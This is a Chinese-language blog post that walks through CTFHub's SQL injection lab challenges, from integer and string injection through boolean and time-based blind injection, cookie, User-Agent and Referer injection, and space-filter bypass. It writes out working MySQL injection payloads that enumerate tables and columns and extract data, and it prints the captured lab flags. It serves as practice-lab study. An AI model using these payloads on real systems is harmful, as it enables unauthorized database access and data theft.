---
layout: post
title: CTFHub Web SQL 注入
subtitle: CTFHub Web SQL 注入
date: 2023-07-02 17:13
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - CTFHub
published: true
number headings: first-level 2, max 4, 1.1., auto
---

## 1. SQL 注入

### 1.1. 整数型注入

```sql
1 #显示
1 and 1=1 #显示
-1 union select 1,2,3 #不显示
-1 union select 1,2 #显示
```

![image](https://img.ghostliner.top/J7WJ6a.png)

获取数据库和表

![image](https://img.ghostliner.top/ZlUuSZ.png)

获取 `flag` 表字段

![image](https://img.ghostliner.top/kPrwbG.png)

获取 flag

![image](https://img.ghostliner.top/WWTK7O.png)

### 1.2. 字符型注入

```sql
# 字符型确认
?id=1' and 1=1--+
?id=1' and 1=-1--+
```

![image](https://img.ghostliner.top/KfiUPt.png)

![image](https://img.ghostliner.top/wXOxLO.png)

![image](https://img.ghostliner.top/Sb52Gr.png)

![image](https://img.ghostliner.top/pfzIk3.png)

### 1.3. 报错注入

![image](https://img.ghostliner.top/HVkijc.png)

![image](https://img.ghostliner.top/h3XHx6.png)

![image](https://img.ghostliner.top/vf7Vyk.png)

![image](https://img.ghostliner.top/ZJOcZI.png)

![image](https://img.ghostliner.top/hGF5SU.png)

### 1.4. 布尔盲注

经测试只有 ` query_error``query_success ` 两种

布尔盲注

```sql
1 and (select count(table_name) from information_schema.tables where table_schema=database())=2 -- 表数量2
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4 -- 表1长度4
1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 -- 表2长度4
```

```sql
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=100 --
```

![image](https://img.ghostliner.top/dNv8OM.png)

表名：flag

```sql
1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='flag')=1 -- 列数1
1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1))=4 -- 列长度4
```

```sql
1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1))=100 --
```

![image](https://img.ghostliner.top/CiqyVT.png)

列名：flag

```sql
1 and length((select flag from flag limit 0,1))=32 --
```

```sql
1 and ascii(substr((select flag from flag limit 0,1),1,1))=100 --
```

![image](https://img.ghostliner.top/utUqtQ.png)

`<font style="color:rgb(139, 139, 139);">ctfhub{f127288b7d5f415118ee54ed}</font>`

### 1.5. 时间盲注

```sql
1 and sleep(3) -- 数字型注入
1 and if((select count(table_name)from information_schema.tables where table_schema=database())=2,sleep(3),0) -- 表数量2
1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4,sleep(2),0) -- 表1长度4
1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4,sleep(2),0) -- 表2长度4
1 and if(ascii(substr((select table_name from information_schema.tables where ta
ble_schema=database() limit 1,1),§1§,1))=§100§,sleep(2),0) -- 表1：news;表2：flag
1 and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='flag')=1,sleep(2),0) -- flag表列数量1
1 and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='flag'))=4,sleep(2),0) -- 列1长度4
1 and if(ascii(substr((select column_name from information_schema.columns where
table_schema=database() and table_name='flag'),§1§,1))=§100§,sleep(2),0) -- 列1名flag
```

```sql
1 and if(ascii(substr((select flag from flag),§1§,1))=§100§,sleep(2),0)
```

![image](https://img.ghostliner.top/Sp6pim.png)

`<font style="color:rgb(139, 139, 139);">ctfhub{77f14ac024782fa5cb10968e}</font>`

### 1.6. MySQL 结构

```sql
1 union select 1,2
1 union select 1,2,3
```

![image](https://img.ghostliner.top/b9MNEF.png)

确定查询两列

![image](https://img.ghostliner.top/AfgPRI.png)

![image](https://img.ghostliner.top/4UMEPQ.png)

![image](https://img.ghostliner.top/7t0OoK.png)

### 1.7. Cookie 注入

![image](https://img.ghostliner.top/2y1qfY.png)

![image](https://img.ghostliner.top/Ydxxa6.png)

![image](https://img.ghostliner.top/V80bbO.png)

![image](https://img.ghostliner.top/1fUhq6.png)

![image](https://img.ghostliner.top/9rkGla.png)

### 1.8. UA 注入

![image](https://img.ghostliner.top/G6zdMS.png)

![image](https://img.ghostliner.top/4JrTFb.png)

![image](https://img.ghostliner.top/5FVUmD.png)

![image](https://img.ghostliner.top/6X1uU5.png)

![image](https://img.ghostliner.top/MHjXKF.png)

### 1.9. Refer 注入

原请求无 refer，手动添加

![image](https://img.ghostliner.top/U7kr6W.png)

![image](https://img.ghostliner.top/VxZMBg.png)

![image](https://img.ghostliner.top/vTiliJ.png)

![image](https://img.ghostliner.top/CQheLF.png)

![image](https://img.ghostliner.top/a82fBc.png)

![image](https://img.ghostliner.top/pQM0bR.png)

### 1.10. 过滤空格

`-1 union select 1,2`

![image](https://img.ghostliner.top/leHG4y.png)

`-1/**/union/**/select/**/1,2`

![image](https://img.ghostliner.top/peQY4l.png)

```sql
-1/**/union/**/select/**/database(),group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()
```

![image](https://img.ghostliner.top/AdE9IA.png)

```sql
-1/**/union/**/select/**/database(),group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='iwnukmmbul'
```

![image](https://img.ghostliner.top/YFXY53.png)

```sql
-1/**/union/**/select/**/database(),group_concat(pvrmhtxmxm)from/**/iwnukmmbul
```

![image](https://img.ghostliner.top/pEbgPv.png)
